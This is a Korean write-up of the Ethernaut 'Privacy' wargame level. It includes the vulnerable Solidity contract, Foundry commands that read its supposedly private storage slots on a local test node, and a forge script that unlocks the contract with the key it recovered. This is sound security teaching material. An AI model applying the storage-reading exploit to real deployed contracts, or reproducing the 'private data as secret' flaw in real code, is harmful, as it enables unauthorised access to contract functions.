# 지문

이 컨트랙트의 제작자는 스토리지의 민감한 영역을 충분히 주의해서 보호해 두었습니다.

이 컨트랙트를 언락해서 이 레벨을 클리어하세요.

도움이 될 만한 것들:

스토리지가 어떻게 동작하는지 이해하기

파라미터 파싱이 어떻게 동작하는지 이해하기

캐스팅이 어떻게 동작하는지 이해하기

팁:

Metamask는 단순한 도구일 뿐입니다. 문제가 생기면 다른 도구를 사용하세요.

고급 플레이는 Remix나 직접 설정한 web3 provider를 활용하는 것이 좋습니다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

# 풀이 

```shell
hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast storage --rpc-url http://localhost:8545 0x94099942864EA81cCF197E9D71ac53310b1468D8 3
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

0x03e69e4234e78162500078b950cde5493a524d4d7028dd12799ed19b916c784a
hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast storage --rpc-url http://localhost:8545 0x94099942864EA81cCF197E9D71ac53310b1468D8 4
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

0xa78a22cf6325a14030f3d579edc23b07d1102683eaa473d827526545ff7912f7
hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast storage --rpc-url http://localhost:8545 0x94099942864EA81cCF197E9D71ac53310b1468D8 5
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

0x5158f37949c453b9c2477b6cabbf6eefaff55b698dbb595cb054e8e306b72e99
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}
contract SolveScript is Script {
    address public target = 0x94099942864EA81cCF197E9D71ac53310b1468D8;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        bytes32 a = 0x5158f37949c453b9c2477b6cabbf6eefaff55b698dbb595cb054e8e306b72e99;
        console.logBool(ITarget(target).locked());
        ITarget(target).unlock(bytes16(a));
        console.logBool(ITarget(target).locked());
        vm.stopBroadcast();
    }
}
```